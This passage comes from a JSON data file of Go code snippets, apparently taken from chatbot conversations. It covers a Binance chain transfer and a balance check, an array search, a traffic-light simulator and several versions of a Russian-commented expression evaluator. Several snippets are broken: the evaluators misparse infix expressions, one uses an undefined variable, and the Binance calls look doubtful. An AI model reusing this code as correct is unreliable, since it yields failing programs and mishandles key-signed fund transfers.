types.NewInt(1_000_000_000_000)},\n        },\n    )\n\n    // Sign the transfer message with the private key\n    signedTx, err := keys.SignTransferMsgWithPrivateKey(privateKey, transferMsg, account.AccountNumber, account.Sequence)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // Broadcast the signed transaction to the Binance Smart Chain network\n    txHash, err := binanceClient.Broadcast(context.Background(), signedTx)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    fmt.Printf(\"Transfer successful! Transaction hash: %s\\n\", txHash)\n}",
    "filename": "4ff44694d50e273fbc1988048ddcdf26_0.go"
  },
  {
    "conversation_hash": "4ff44694d50e273fbc1988048ddcdf26",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"fmt\"\n    \"log\"\n\n    \"github.com/binance-chain/go-sdk/client\"\n    \"github.com/ethereum/go-ethereum/common\"\n)\n\nfunc main() {\n    // Replace with your own Binance Smart Chain testnet RPC endpoint\n    binanceClient := client.NewClient(\"https://testnet-dex.binance.org\")\n\n    // Replace with the address you want to check the balance of\n    address := common.HexToAddress(\"YOUR_ADDRESS_HERE\")\n\n    // Get the balance of the address\n    balance, err := binanceClient.BalanceManager().BalanceOf(context.Background(), address, \"BNB\")\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    fmt.Printf(\"BNB balance of address %s: %d\\n\", address.Hex(), balance.Amount.Int64())\n}",
    "filename": "4ff44694d50e273fbc1988048ddcdf26_1.go"
  },
  {
    "conversation_hash": "501b495bfb4b82f707e5e3d22aff5f90",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func IsExist(arr []int, target int) bool {\n    for _, val := range arr {\n        if val == target {\n            return true\n        }\n    }\n    return false\n}",
    "filename": "501b495bfb4b82f707e5e3d22aff5f90_0.go"
  },
  {
    "conversation_hash": "501b495bfb4b82f707e5e3d22aff5f90",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "arr := []int{1, 2, 3, 4, 5}\ntarget := 3\nif IsExist(arr, target) {\n    fmt.Printf(\"%d exists in array\\n\", target)\n} else {\n    fmt.Printf(\"%d does not exist in array\\n\", target)\n}",
    "filename": "501b495bfb4b82f707e5e3d22aff5f90_1.go"
  },
  {
    "conversation_hash": "ce9f509e6d1319070268f464c1e4c9dc",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "{\n     \"tokenId\": \"tok_123456789\",\n     \"amount\": 100,\n     \"currency\": \"pln\"\n   }",
    "filename": "ce9f509e6d1319070268f464c1e4c9dc_0.go"
  },
  {
    "conversation_hash": "3ce4cfff65f2acbd9a4e1d4cc4ba3c69",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math/rand\"\n\t\"time\"\n)\n\nconst (\n\tdurasiLampuMerah        = 3 // Detik\n\tdurasiMinimalLampuHijau = 10 // Detik\n\tdurasiMaksimalLampuHijau = 30 // Detik\n)\n\nfunc readTrafikJalan() [4]int {\n\treturn [4]int{rand.Intn(100), rand.Intn(100), rand.Intn(100), rand.Intn(100)}\n}\n\nfunc hitungDurasiLampuHijau(jumlahTrafik [4]int) [4]float64 {\n\ttotalTrafik := 0\n\tfor _, trafik := range jumlahTrafik {\n\t\ttotalTrafik += trafik\n\t}\n\n\tvar durasiLampuHijau [4]float64\n\tfor i, trafik := range jumlahTrafik {\n\t\tdurasiLampuHijau[i] = float64(durasiMinimalLampuHijau) + float64(trafik)/float64(totalTrafik)*(float64(durasiMaksimalLampuHijau)-float64(durasiMinimalLampuHijau))\n\t}\n\n\treturn durasiLampuHijau\n}\n\nfunc nyalaLampuHijau(jalan int, durasiLampuHijau float64) {\n\tfmt.Printf(\"Jalan %d: lampu hijau selama %f detik\\n\", jalan+1, durasiLampuHijau)\n\ttime.Sleep(time.Duration(durasiLampuHijau) * time.Second)\n}\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\n\tfor {\n\t\tjumlahTrafik := readTrafikJalan()\n\t\tfmt.Println(\"Jumlah trafik di setiap jalan:\", jumlahTrafik)\n\n\t\tdurasiLampuHijau := hitungDurasiLampuHijau(jumlahTrafik)\n\t\tfmt.Println(\"Durasi lampu hijau di setiap jalan:\", durasiLampuHijau)\n\n\t\tfor j := 0; j < 4; j++ {\n\t\t\tnyalaLampuHijau(j, durasiLampuHijau[j])\n\t\t\ttime.Sleep(durasiLampuMerah * time.Second)\n\t\t}\n\t}\n}",
    "filename": "3ce4cfff65f2acbd9a4e1d4cc4ba3c69_5.go"
  },
  {
    "conversation_hash": "3e8ce34cd65405824fd03fdf09013861",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"github.com/Knetic/govaluate\"\n    \"os\"\n    \"strings\"\n)\n\nfunc main() {\n    expression, err := govaluate.NewEvaluableExpression(\"3^2 + sqrt(16) + x\")\n    if err != nil {\n        fmt.Println(\"Ошибка при создании выражения:\", err)\n        os.Exit(1)\n    }\n\n    parameters := make(map[string]interface{})\n    parameters[\"x\"] = 5\n\n    result, err := expression.Evaluate(parameters)\n    if err != nil {\n        fmt.Println(\"Ошибка при вычислении выражения:\", err)\n        os.Exit(1)\n    }\n\n    fmt.Printf(\"Результат вычисления: %.2f\\n\", result)\n}",
    "filename": "3e8ce34cd65405824fd03fdf09013861_0.go"
  },
  {
    "conversation_hash": "3e8ce34cd65405824fd03fdf09013861",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math\"\n\t\"strconv\"\n\t\"strings\"\n)\n\ntype TokenType int\n\nconst (\n\tNumber TokenType = iota\n\tOperator\n\tVariable\n)\n\ntype Token struct {\n\tType  TokenType\n\tValue string\n}\n\nvar variables = make(map[string]float64)\n\nfunc parseExpression(expression string) ([]Token, error) {\n\ttokens := []Token{}\n\tvar buffer strings.Builder\n\n\tfor _, ch := range expression {\n\t\tif ch == ' ' {\n\t\t\tcontinue\n\t\t}\n\n\t\tif strings.ContainsRune(\"+-*/^()\", ch) {\n\t\t\tif buffer.Len() > 0 {\n\t\t\t\ttoken, err := createToken(buffer.String())\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn nil, err\n\t\t\t\t}\n\t\t\t\ttokens = append(tokens, token)\n\t\t\t\tbuffer.Reset()\n\t\t\t}\n\t\t\ttokens = append(tokens, Token{Type: Operator, Value: string(ch)})\n\t\t} else {\n\t\t\tbuffer.WriteRune(ch)\n\t\t}\n\t}\n\n\tif buffer.Len() > 0 {\n\t\ttoken, err := createToken(buffer.String())\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\ttokens = append(tokens, token)\n\t}\n\n\treturn tokens, nil\n}\n\nfunc createToken(value string) (Token, error) {\n\tif _, err := strconv.ParseFloat(value, 64); err == nil {\n\t\treturn Token{Type: Number, Value: value}, nil\n\t}\n\n\tif _, ok := variables[value]; ok {\n\t\treturn Token{Type: Variable, Value: value}, nil\n\t}\n\n\treturn Token{}, fmt.Errorf(\"неизвестный токен: %s\", value)\n}\n\nfunc compute(expression string) (float64, error) {\n\ttokens, err := parseExpression(expression)\n\tif err != nil {\n\t\treturn 0, err\n\t}\n\n\tvar compute func() (float64, error)\n\tcompute = func() (float64, error) {\n\t\tif len(tokens) == 0 {\n\t\t\treturn 0, nil\n\t\t}\n\n\t\ttoken := tokens[0]\n\t\ttokens = tokens[1:]\n\n\t\tswitch token.Type {\n\t\tcase Number:\n\t\t\tvalue, _ := strconv.ParseFloat(token.Value, 64)\n\t\t\treturn value, nil\n\t\tcase Variable:\n\t\t\tvalue := variables[token.Value]\n\t\t\treturn value, nil\n\t\tcase Operator:\n\t\t\tleft, err := compute()\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\n\t\t\tif token.Value == \"+\" {\n\t\t\t\tright, err := compute()\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn 0, err\n\t\t\t\t}\n\t\t\t\treturn left + right, nil\n\t\t\t} else if token.Value == \"-\" {\n\t\t\t\tright, err := compute()\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn 0, err\n\t\t\t\t}\n\t\t\t\treturn left - right, nil\n\t\t\t} else if token.Value == \"*\" {\n\t\t\t\tright, err := compute()\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn 0, err\n\t\t\t\t}\n\t\t\t\treturn left * right, nil\n\t\t\t} else if token.Value == \"/\" {\n\t\t\t\tright, err := compute()\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn 0, err\n\t\t\t\t}\n\t\t\t\treturn left / right, nil\n\t\t\t} else if token.Value == \"^\" {\n\t\t\t\tright, err := compute()\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn 0, err\n\t\t\t\t}\n\t\t\t\treturn math.Pow(left, right), nil\n\t\t\t} else if token.Value == \"(\" {\n\t\t\t\tvalue, err := compute()\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn 0, err\n\t\t\t\t}\n\n\t\t\t\tif len(tokens) == 0 || tokens[0].Value != \")\" {\n\t\t\t\t\treturn 0, fmt.Errorf(\"ожидалась закрывающая скобка\")\n\t\t\t\t}\n\t\t\t\ttokens = tokens[1:]\n\n\t\t\t\treturn value, nil\n\t\t\t} else if token.Value == \")\" {\n\t\t\t\treturn 0, fmt.Errorf(\"неожиданная закрывающая скобка\")\n\t\t\t}\n\t\t}\n\n\t\treturn 0, fmt.Errorf(\"неизвестный токен: %v\", token)\n\t}\n\n\treturn compute()\n}\n\nfunc main() {\n\tvariables[\"x\"] = 5\n\n\texpression := \"3^2 + sqrt(16) + x\"\n\texpression = strings.Replace(expression, \"sqrt(\", \"((\", 1) + \")^(1/2)\"\n\n\tresult, err := compute(expression)\n\tif err != nil {\n\t\tfmt.Printf(\"Ошибка при вычислении выражения: %v\\n\", err)\n\t} else {\n\t\tfmt.Printf(\"Результат вычисления: %.2f\\n\", result)\n\t}\n}",
    "filename": "3e8ce34cd65405824fd03fdf09013861_1.go"
  },
  {
    "conversation_hash": "3e8ce34cd65405824fd03fdf09013861",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math\"\n\t\"strconv\"\n\t\"strings\"\n)\n\ntype TokenType int\n\nconst (\n\tNumber TokenType = iota\n\tOperator\n\tVariable\n\tFunction\n)\n\ntype Token struct {\n\tType  TokenType\n\tValue string\n}\n\nvar variables = make(map[string]float64)\n\nfunc parseExpression(expression string) ([]Token, error) {\n\ttokens := []Token{}\n\tvar buffer strings.Builder\n\n\tfor _, ch := range expression {\n\t\tif ch == ' ' {\n\t\t\tcontinue\n\t\t}\n\n\t\tif strings.ContainsRune(\"+-*/^()\", ch) {\n\t\t\tif buffer.Len() > 0 {\n\t\t\t\ttoken, err := createToken(buffer.String())\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn nil, err\n\t\t\t\t}\n\t\t\t\ttokens = append(tokens, token)\n\t\t\t\tbuffer.Reset()\n\t\t\t}\n\t\t\ttokens = append(tokens, Token{Type: Operator, Value: string(ch)})\n\t\t} else {\n\t\t\tbuffer.WriteRune(ch)\n\t\t}\n\t}\n\n\tif buffer.Len() > 0 {\n\t\ttoken, err := createToken(buffer.String())\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\ttokens = append(tokens, token)\n\t}\n\n\treturn tokens, nil\n}\n\nfunc createToken(value string) (Token, error) {\n\tif _, err := strconv.ParseFloat(value, 64); err == nil {\n\t\treturn Token{Type: Number, Value: value}, nil\n\t}\n\n\tif _, ok := variables[value]; ok {\n\t\treturn Token{Type: Variable, Value: value}, nil\n\t}\n\n\tif value == \"root\" {\n\t\treturn Token{Type: Function, Value: value}, nil\n\t}\n\n\treturn Token{}, fmt.Errorf(\"неизвестный токен: %s\", value)\n}\n\nfunc compute(tokens []Token) (float64, error) {\n\tif len(tokens) == 0 {\n\t\treturn 0, fmt.Errorf(\"ожидался токен\")\n\t}\n\n\ttoken := tokens[0]\n\ttokens = tokens[1:]\n\n\tswitch token.Type {\n\tcase Number:\n\t\tvalue, _ := strconv.ParseFloat(token.Value, 64)\n\t\treturn value, nil\n\tcase Variable:\n\t\tvalue := variables[token.Value]\n\t\treturn value, nil\n\tcase Operator:\n\t\tleft, err := compute(tokens)\n\t\tif err != nil {\n\t\t\treturn 0, err\n\t\t}\n\n\t\tif token.Value == \"+\" {\n\t\t\tright, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\treturn left + right, nil\n\t\t} else if token.Value == \"-\" {\n\t\t\tright, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\treturn left - right, nil\n\t\t} else if token.Value == \"*\" {\n\t\t\tright, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\treturn left * right, nil\n\t\t} else if token.Value == \"/\" {\n\t\t\tright, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\treturn left / right, nil\n\t\t} else if token.Value == \"^\" {\n\t\t\tright, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\treturn math.Pow(left, right), nil\n\t\t}\n\tcase Function:\n\t\tif token.Value == \"root\" {\n\t\t\tbase, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\texponent, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\treturn math.Pow(base, 1/exponent), nil\n\t\t}\n\tdefault:\n\t\treturn 0, fmt.Errorf(\"неизвестный токен: %v\", token)\n\t}\n\n\treturn 0, fmt.Errorf(\"необработанный токен: %v\", token)\n}\n\nfunc main() {\n\tvariables[\"x\"] = 5\n\n\texpression := \"3^2 + root(16, 2) + x\"\n\n\ttokens, err := parseExpression(expression)\n\tif err != nil {\n\t\tfmt.Printf(\"Ошибка при парсинге выражения: %v\\n\", err)\n\t\treturn\n\t}\n\n\tresult, err := compute(tokens)\n\tif err != nil {\n\t\tfmt.Printf(\"Ошибка при вычислении выражения: %v\\n\", err)\n\t} else {\n\t\tfmt.Printf(\"Результат вычисления: %.2f\\n\", result)\n\t}\n}",
    "filename": "3e8ce34cd65405824fd03fdf09013861_2.go"
  },
  {
    "conversation_hash": "3e8ce34cd65405824fd03fdf09013861",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"math\"\n    \"strconv\"\n    \"strings\"\n)\n\ntype TokenType int\n\nconst (\n    Number TokenType = iota\n    Operator\n    Variable\n    Function\n)\n\ntype Token struct {\n    Type  TokenType\n    Value string\n}\n\nvar variables = make(map[string]float64)\n\nfunc parseExpression(expression string) ([]Token, error) {\n    tokens := []Token{}\n    var buffer strings.Builder\n\n    for _, ch := range expression {\n        if ch == ' ' {\n            continue\n        }\n\n        if strings.ContainsRune(\"+-*/^()\", ch) {\n            if buffer.Len() > 0 {\n                token, err := createToken(buffer.String())\n                if err != nil {\n                    return nil, err\n                }\n                tokens = append(tokens, token)\n                buffer.Reset()\n            }\n            tokens = append(tokens, Token{Type: Operator, Value: string(ch)})\n        } else {\n            if strings.ContainsRune(\"()^\", ch) {\n                buffer.WriteRune(ch)\n            } else {\n                buffer.WriteRune(ch)\n                token, err := createToken(buffer.String())\n                if err == nil {\n                    tokens = append(tokens, token)\n                    buffer.Reset()\n                }\n            }\n        }\n    }\n\n    if buffer.Len() > 0 {\n        token, err := createToken(buffer.String())\n        if err != nil {\n            return nil, err\n        }\n        tokens = append(tokens, token)\n    }\n\n    return tokens, nil\n}\n\nfunc createToken(value string) (Token, error) {\n    if _, err := strconv.ParseFloat(value, 64); err == nil {\n        return Token{Type: Number, Value: value}, nil\n    }\n\n    if _, ok := variables[value]; ok {\n        return Token{Type: Variable, Value: value}, nil\n    }\n\n    if value == \"root\" {\n        return Token{Type: Function, Value: value}, nil\n    }\n\n    return Token{}, fmt.Errorf(\"неизвестный токен: %s\", value)\n}\n\nfunc compute(tokens []Token) (float64, error) {\n    if len(tokens) == 0 {\n        return 0, fmt.Errorf(\"ожидался токен\")\n    }\n\n    token := tokens[0]\n    tokens = tokens[1:]\n\n    switch token.Type {\n    case Number:\n        value, _ := strconv.ParseFloat(token.Value, 64)\n        return value, nil\n    case Variable:\n        value := variables[token.Value]\n        return value, nil\n    case Operator:\n        left, err := compute(tokens)\n        if err != nil {\n            return 0, err\n        }\n\n        if token.Value == \"+\" {\n            right, err := compute(tokens)\n            if err != nil {\n                return 0, err\n            }\n            return left + right, nil\n        } else if token.Value == \"-\" {\n            right, err := compute(tokens)\n            if err != nil {\n                return 0, err\n            }\n            return left - right, nil\n        } else if token.Value == \"*\" {\n            right, err := compute(tokens)\n            if err != nil {\n                return 0, err\n            }\n            return left * right, nil\n        } else if token.Value == \"/\" {\n            right, err := compute(tokens)\n            if err != nil {\n                return 0, err\n            }\n            return left / right, nil\n        } else if token.Value == \"^\" {\n            right, err := compute(tokens)\n            if err != nil {\n                return 0, err\n            }\n            return math.Pow(left, right), nil\n        }\n    case Function:\n        if token.Value == \"root\" {\n            base, err := compute(tokens)\n            if err != nil {\n                return 0, err\n            }\n            exponent, err := compute(tokens)\n            if err != nil {\n                return 0, err\n            }\n            return math.Pow(base, 1/exponent), nil\n        }\n    default:\n        return 0, fmt.Errorf(\"неизвестный токен: %v\", token)\n    }\n\n    return 0, fmt.Errorf(\"необработанный токен: %v\", token)\n}\n\nfunc main() {\n    variables[\"x\"] = 5\n\n    expression := \"3^2 + root(16, 2) + x\"\n\n    tokens, err := parseExpression(expression)\n    if err != nil {\n        fmt.Printf(\"Ошибка при парсинге выражения: %v\\n\", err)\n        return\n    }\n\n    result, err := compute(tokens)\n    if err != nil {\n        fmt.Printf(\"Ошибка при вычислении выражения: %v\\n\", err)\n    } else {\n        fmt.Printf(\"Результат вычисления: %.2f\\n\", result)\n    }\n}",
    "filename": "3e8ce34cd65405824fd03fdf09013861_3.go"
  },
  {
    "conversation_hash": "3e8ce34cd65405824fd03fdf09013861",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"math\"\n    \"strconv\"\n    \"strings\"\n)\n\ntype TokenType int\n\nconst (\n    Number TokenType = iota\n    Operator\n    Variable\n    Function\n    ArgumentSeparator\n)\n\ntype Token struct {\n    Type  TokenType\n    Value string\n}\n\nvar variables = make(map[string]float64)\n\nfunc parseExpression(expression string) ([]Token, error) {\n    tokens := []Token{}\n    var buffer strings.Builder\n\n    for _, ch := range expression {\n        if ch == ' ' {\n            continue\n        }\n        \n        if ch == ',' {\n            if buffer.Len() > 0 {\n                token, err := createToken(buffer.String())\n                if err != nil {\n                    return nil, err\n                }\n                tokens = append(tokens, token)\n                buffer.Reset()\n            }\n            tokens = append(tokens, Token{Type: ArgumentSeparator, Value: string(ch)})\n            continue\n        }\n\n        if strings.ContainsRune(\"+-*/^()\", ch) {\n            if buffer.Len() > 0 {\n                token, err := createToken(buffer.String())\n                if err != nil {\n                    return nil, err\n                }\n                tokens = append(tokens, token)\n                buffer.Reset()\n            }\n            tokens = append(tokens, Token{Type: Operator, Value: string(ch)})\n        } else {\n            buffer.WriteRune(ch)\n        }\n    }\n\n    if buffer.Len() > 0 {\n        token, err := createToken(buffer.String())\n        if err != nil {\n            return nil, err\n        }\n        tokens = append(tokens, token)\n    }\n\n    return tokens, nil\n}\n\nfunc createToken(value string) (Token, error) {\n    if _, err := strconv.ParseFloat(value, 64); err == nil {\n        return Token{Type: Number, Value: value}, nil\n    }\n\n    if _, ok := variables[value]; ok {\n        return Token{Type: Variable, Value: value}, nil\n    }\n\n    if value == \"root\" {\n        return Token{Type: Function, Value: value}, nil\n    }\n\n    return Token{}, fmt.Errorf(\"неизвестный токен: %s\", value)\n}\n\nfunc compute(tokens []Token) (float64, []Token, error) {\n    if len(tokens) == 0 {\n        return 0, tokens, fmt.Errorf(\"ожидался токен\")\n    }\n\n    token := tokens[0]\n    tokens = tokens[1:]\n\n    switch token.Type {\n    case Number:\n        value, _ := strconv.ParseFloat(token.Value, 64)\n        return value, tokens, nil\n    case Variable:\n        value := variables[token.Value]\n        return value, tokens, nil\n    case Operator:\n        left, leftoverTokens, err := compute(tokens)\n        if err != nil {\n            return 0, tokens, err\n        }\n\n        if token.Value == \"+\" {\n            right, leftoverTokens, err := compute(leftoverTokens)\n            if err != nil {\n                return 0, leftoverTokens, err\n            }\n            return left + right, leftoverTokens, nil\n        } else if token.Value == \"-\" {\n            right, leftoverTokens, err := compute(leftoverTokens)\n            if err != nil {\n                return 0, leftoverTokens, err\n            }\n            return left - right, leftoverTokens, nil\n        } else if token.Value == \"*\" {\n            right, leftoverTokens, err := compute(leftoverTokens)\n            if err != nil {\n                return 0, leftoverTokens, err\n            }\n            return left * right, leftoverTokens, nil\n        } else if token.Value == \"/\" {\n            right, leftoverTokens, err := compute(leftoverTokens)\n            if err != nil {\n                return 0, leftoverTokens, err\n            }\n            return left / right, leftoverTokens, nil\n        } else if token.Value == \"^\" {\n            right, leftoverTokens, err := compute(leftoverTokens)\n            if err != nil {\n                return 0, leftoverTokens, err\n            }\n            return math.Pow(left, right), leftoverTokens, nil\n        }\n    case Function:\n        if token.Value == \"root\" {\n            base, leftoverTokens, err := compute(tokens)\n            if err != nil {\n                return 0, tokens, err\n            }\n\n            if len(leftoverTokens) == 0 || leftoverTokens[0].Type != ArgumentSeparator {\n                return 0, leftovers, fmt.Errorf(\"ожидался разделитель аргументов ','\")\n            }\n\n            exponent, leftoverTokens, err := compute(leftoverTokens[1:])\n            if err != nil {\n                return 0, leftoverTokens, err\n            }\n            return math.Pow(base, 1/exponent), leftoverTokens, nil\n        }\n    default:\n        return 0, tokens, fmt.Errorf(\"неизвестный токен: %v\", token)\n    }\n\n    return 0, tokens, fmt.Errorf(\"необработанный токен: %v\", token)\n}\n\nfunc main() {\n    variables[\"x\"] = 5\n\n    expression := \"3^2 + root(27, 3) + x\"\n\n    // альтернативный вариант корня с другим показателем степени:\n    // expression := \"3^2 + root(625, 4) + x\"\n\n    tokens, err := parseExpression(expression)\n    if err != nil {\n        fmt.Printf(\"Ошибка при парсинге выражения: %v\\n\", err)\n        return\n    }\n\n    result, _, err := compute(tokens)\n    if err != nil {\n        fmt.Printf(\"Ошибка при вычислении выражения: %v\\n\", err)\n    } else {\n        fmt.Printf(\"Результат вычисления: %.2f\\n\", result)\n    }\n}",
    "filename": "3e8ce34cd65405824fd03fdf09013861_5.go"
  },
  {
    "conversation_hash": "3e8ce34cd65405824fd03fdf09013861",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math\"\n\t\"strconv\"\n\t\"strings\"\n)\n\ntype TokenType int\n\nconst (\n\tNumber TokenType = iota\n\tOperator\n\tVariable\n\tFunction\n\tArgumentSeparator\n)\n\ntype Token struct {\n\tType  TokenType\n\tValue string\n}\n\nvar variables = make(map[string]float64)\n\nfunc parseExpression(expression string) ([]Token, error) {\n\ttokens := []Token{}\n\tvar buffer strings.Builder\n\n\tfor _, ch := range expression {\n\t\tif ch == ' ' {\n\t\t\tcontinue\n\t\t}\n\n\t\tif strings.ContainsRune(\"+-*/^()!\", ch) {\n\t\t\tif buffer.Len() > 0 {\n\t\t\t\ttoken, err := createToken(buffer.String())\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn nil, err\n\t\t\t\t}\n\t\t\t\ttokens = append(tokens, token)\n\t\t\t\tbuffer.Reset()\n\t\t\t}\n\t\t\ttokens = append(tokens, Token{Type: Operator, Value: string(ch)})\n\t\t} else if ch == ',' {\n\t\t\tif buffer.Len() > 0 {\n\t\t\t\ttoken, err := createToken(buffer.String())\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn nil, err\n\t\t\t\t}\n\t\t\t\ttokens = append(tokens, token)\n\t\t\t\tbuffer.Reset()\n\t\t\t}\n\t\t\ttokens = append(tokens, Token{Type: ArgumentSeparator, Value: string(ch)})\n\t\t} else {\n\t\t\tbuffer.WriteRune(ch)\n\t\t}\n\t}\n\n\tif buffer.Len() > 0 {\n\t\ttoken, err := createToken(buffer.String())\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\ttokens = append(tokens, token)\n\t}\n\n\treturn tokens, nil\n}\n\nfunc createToken(value string) (Token, error) {\n\tif _, err := strconv.ParseFloat(value, 64); err == nil {\n\t\treturn Token{Type: Number, Value: value}, nil\n\t}\n\n\tif _, ok := variables[value]; ok {\n\t\treturn Token{Type: Variable, Value: value}, nil\n\t}\n\n\tif value == \"root\" {\n\t\treturn Token{Type: Function, Value: value}, nil\n\t}\n\n\treturn Token{}, fmt.Errorf(\"неизвестный токен: %s\", value)\n}\n\nfunc compute(tokens []Token) (float64, []Token, error) {\n\tif len(tokens) == 0 {\n\t\treturn 0, tokens, fmt.Errorf(\"ожидался токен\")\n\t}\n\n\ttoken := tokens[0]\n\ttokens = tokens[1:]\n\n\tswitch token.Type {\n\tcase Number:\n\t\tvalue, _ := strconv.ParseFloat(token.Value, 64)\n\t\treturn value, tokens, nil\n\tcase Variable:\n\t\tvalue := variables[token.Value]\n\t\treturn value, tokens, nil\n\tcase Operator:\n\t\tleft, leftoverTokens, err := compute(tokens)\n\t\tif err != nil {\n\t\t\treturn 0, tokens, err\n\t\t}\n\t\ttokens = leftoverTokens\n\n\t\tif token.Value == \"+\" {\n\t\t\tright, leftoverTokens, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, tokens, err\n\t\t\t}\n\t\t\treturn left + right, leftoverTokens, nil\n\t\t} else if token.Value == \"-\" {\n\t\t\tright, leftoverTokens, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, tokens, err\n\t\t\t}\n\t\t\treturn left - right, leftoverTokens, nil\n\t\t} else if token.Value == \"*\" {\n\t\t\tright, leftoverTokens, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, tokens, err\n\t\t\t}\n\t\t\treturn left * right, leftoverTokens, nil\n\t\t} else if token.Value == \"/\" {\n\t\t\tright, leftoverTokens, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, tokens, err\n\t\t\t}\n\t\t\treturn left / right, leftoverTokens, nil\n\t\t} else if token.Value == \"^\" {\n\t\t\tright, leftoverTokens, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, tokens, err\n\t\t\t}\n\t\t\treturn math.Pow(left, right), leftoverTokens, nil\n\t\t} else if token.Value == \")\" {\n\t\t\treturn left, tokens, fmt.Errorf(\"неожиданная закрывающая скобка\")\n\t\t}\n\tcase Function:\n\t\tif token.Value == \"root\" {\n\t\t\tif len(tokens) == 0 {\n\t\t\t\treturn 0, tokens, fmt.Errorf(\"ожидался аргумент функции\")\n\t\t\t}\n\n\t\t\tbase, leftoverTokens, err := compute(tokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, tokens, err\n\t\t\t}\n\t\t\tif len(leftoverTokens) == 0 || leftoverTokens[0].Type != ArgumentSeparator {\n\t\t\t\treturn 0, tokens, fmt.Errorf(\"ожидался разделитель аргументов ','\")\n\t\t\t}\n\n\t\t\texpTokens := leftoverTokens[1:]\n\t\t\texponent, leftoverTokens, err := compute(expTokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, tokens, err\n\t\t\t}\n\t\t\treturn math.Pow(base, 1/exponent), leftoverTokens, nil\n\t\t}\n\tcase ArgumentSeparator:\n\t\treturn 0, tokens, fmt.Errorf(\"неожиданный разделитель аргументов ','\")\n\t}\n\n\treturn 0, tokens, fmt.Errorf(\"необработанный токен: %v\", token)\n}\n\nfunc main() {\n\tvariables[\"x\"] = 5\n\n\texpression := \"3^2 + root(27, 3) + x\"\n\n\ttokens, err := parseExpression(expression)\n\tif err != nil {\n\t\tfmt.Printf(\"Ошибка при парсинге выражения: %v\\n\", err)\n\t\treturn\n\t}\n\n\tresult, _, err := compute(tokens)\n\tif err != nil {\n\t\tfmt.Printf(\"Ошибка при вычислении выражения: %v\\n\", err)\n\t} else {\n\t\tfmt.Printf(\"Результат вычисления: %.2f\\n\", result)\n\t}\n}",
    "filename": "3e8ce34cd65405824fd03fdf09013861_6.go"
  },
  {
    "conversation_hash": "3e8ce34cd65405824fd03fdf09013861",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"github.com/ALTree/bigfloat\"\n\t\"math/big\"\n\t\"strconv\"\n\t\"strings\"\n)\n\ntype TokenType int\ntype Token struct {\n\tValue string\n\tType  TokenType\n}\ntype Tokens []Token\n\nconst (\n\tNumber TokenType = iota\n\tOperator\n\tVariable\n\tFunction\n\tArgumentSeparator\n)\n\n// parseExpression\n// получает строку выражения и преобразует ее в набор токенов\nfunc parseExpression(exp string) (result Tokens, err error) {\n\tvar buffer strings.Builder\n\tlexer := func(ch rune) {\n\t\tif ch == ',' {\n\t\t\tif buffer.Len() > 0 {\n\t\t\t\ttoken, err := createToken(buffer.String())\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\tresult = append(result, token)\n\t\t\t\tbuffer.Reset()\n\t\t\t}\n\t\t\tresult = append(result, Token{Type: ArgumentSeparator, Value: string(ch)})\n\t\t} else if strings.ContainsRune(\" \\t\\r\\n\", ch) {\n\t\t\treturn\n\t\t} else if strings.ContainsRune(\"()^*/+-\", ch) {\n\t\t\tif 